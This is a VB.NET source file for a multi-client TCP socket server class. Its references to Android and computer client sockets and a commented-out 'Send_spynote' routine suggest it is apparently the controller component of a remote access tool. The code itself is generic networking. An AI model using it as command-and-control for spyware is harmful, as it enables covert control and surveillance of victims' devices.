Imports System.Net
Imports System.Net.Sockets
'##################################################
'################### CODED  #######################
'##################### BY #########################
'############### Saher Blue Eagle  ################
'###############  XPR OPEN SOURCE  ################
'##################################################
'##################################################
Public Class SocketServer
    Private S As TcpListener
    Sub stops(ByVal Pp As Integer)
        S = New TcpListener(Pp)
        Try
            S.Stop()
            Dim T As New Threading.Thread(AddressOf PND, 10)
            T.Abort()

        Catch : End Try
    End Sub
    Sub Start(ByVal P As Integer)
        S = New TcpListener(P)
        S.Start()
        Dim T As New Threading.Thread(AddressOf PND, 10)
        T.Start()
    End Sub
    Sub Send(ByVal sock As Integer, ByVal s As String)
        Try
            s = Syn & s & Syn & vbNewLine '.   Strings.Space(1) &

            Send(sock, SBB(s))
        Catch ex As Exception
            Dim ips_and As String = IP(sock)
            Form1.Remove_COMP_SOCK(ips_and)
            Disconnect(sock)
        End Try
     
    End Sub
    Sub Send_DX(ByVal sock As Integer, ByVal s As String)
        Try
           
            s = Strings.Space(1) & Syn & s & Syn   '.   Strings.Space(1) &
            'MsgBox(s)
            SK(sock).Send(SBB(s))

        Catch ex As Exception
            Dim ips_and As String = IP(sock)
            Form1.Remove_Android_SOCK(ips_and)
            Disconnect(sock)
        End Try
    

    End Sub
    'Public Sub Send_spynote(ByVal i As Integer, ByVal str As String)
    '    If Me.TcpState Then
    '        Me.Send_0(i, store_0.Encoding_0.GetBytes((Strings.Space(1) & Me.Syn & str & Me.Syn)))
    '    End If
    'End Sub
    Sub Send(ByVal sock As Integer, ByVal b As Byte())

        Try
            Dim m As New IO.MemoryStream
            m.Write(b, 0, b.Length)
            m.Write(SBB(SPL), 0, SPL.Length)
            SK(sock).Send(m.ToArray, 0, m.Length, SocketFlags.None)
            m.Dispose()
        Catch ex As Exception

            Disconnect(sock)
        End Try
    End Sub
    Private SKT As Integer = -1
    Public SK(9999) As Socket
    Public Event Data(ByVal sock As Integer, ByVal B As Byte())
    Public Event DisConnected(ByVal sock As Integer)
    Public Event Connected(ByVal sock As Integer)
    Public SPL As String = Syn '& vbNewLine ' split packets by this word
    Private Function NEWSKT() As Integer
re:
        Threading.Thread.CurrentThread.Sleep(1)
        SKT += 1
        If SKT = SK.Length Then
            SKT = 0
            GoTo re
        End If
        If Online.Contains(SKT) = False Then
            Online.Add(SKT)
            Return SKT.ToString.Clone
        End If
        GoTo re
    End Function
    Public Online As New List(Of Integer) ' online clients
    Private Sub PND()
        Try
            ReDim SK(9999)
re:

            Threading.Thread.CurrentThread.Sleep(1)
            If S.Pending Then

                Dim sock As Integer = NEWSKT()
                SK(sock) = S.AcceptSocket

                SK(sock).ReceiveBufferSize = 99999
                SK(sock).SendBufferSize = 99999
                SK(sock).ReceiveTimeout = 9000
                SK(sock).SendTimeout = 9000

                Dim t As New Threading.Thread(AddressOf RC, 10)
                t.Start(sock)

                RaiseEvent Connected(sock)

            End If
            GoTo re
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
       
    End Sub
    Public Sub Disconnect(ByVal Sock As Integer)

        Try
            SK(Sock).Disconnect(False)
        Catch ex As Exception
        End Try
        Try
            SK(Sock).Close()
        Catch ex As Exception
        End Try
        SK(Sock) = Nothing

    End Sub
    Sub RC(ByVal sock As Integer)

        Dim M As New IO.MemoryStream
        Dim cc As Integer = 0

re:

        cc += 1
        If cc = 1000 Then
            Try
                If SK(sock).Poll(-1, Net.Sockets.SelectMode.SelectRead) And SK(sock).Available <= 0 Then
                    GoTo e
                End If
            Catch ex As Exception
                GoTo e
            End Try
            cc = 0
        End If
        Try
            If SK(sock) IsNot Nothing Then

                If SK(sock).Connected Then
                    If SK(sock).Available > 0 Then
                        Dim B(SK(sock).Available - 1) As Byte
                        SK(sock).Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                        M.Write(B, 0, B.Length)


rr:
                        If BSS(M.ToArray).Contains(SPL) Then
                            Dim A As Array = fxx(M.ToArray, SPL)
                            RaiseEvent Data(sock, A(0))
                            M.Dispose()
                            M = New IO.MemoryStream
                            If A.Length = 2 Then
                                M.Write(A(1), 0, A(1).length)
                                Threading.Thread.CurrentThread.Sleep(1)
                                GoTo rr
                            End If

                        End If

                    End If
                Else
                    GoTo e
                End If
            Else
                GoTo e
            End If
        Catch ex As Exception
            GoTo e
        End Try
        Threading.Thread.CurrentThread.Sleep(1)
        GoTo re
e:
        Disconnect(sock)
        cc -= 1
        Try
            Online.Remove(sock)
        Catch ex As Exception
        End Try
        RaiseEvent DisConnected(sock)
    End Sub
    Private oIP(9999) As String
    Public Function IP(ByRef sock As Integer) As String
        Try
            oIP(sock) = Split(SK(sock).RemoteEndPoint.ToString(), ":")(0)
            Return oIP(sock)
        Catch ex As Exception
            If oIP(sock) Is Nothing Then
                Return "X.X.X.X"
            Else
                Return oIP(sock)
            End If
        End Try
    End Function
End Class
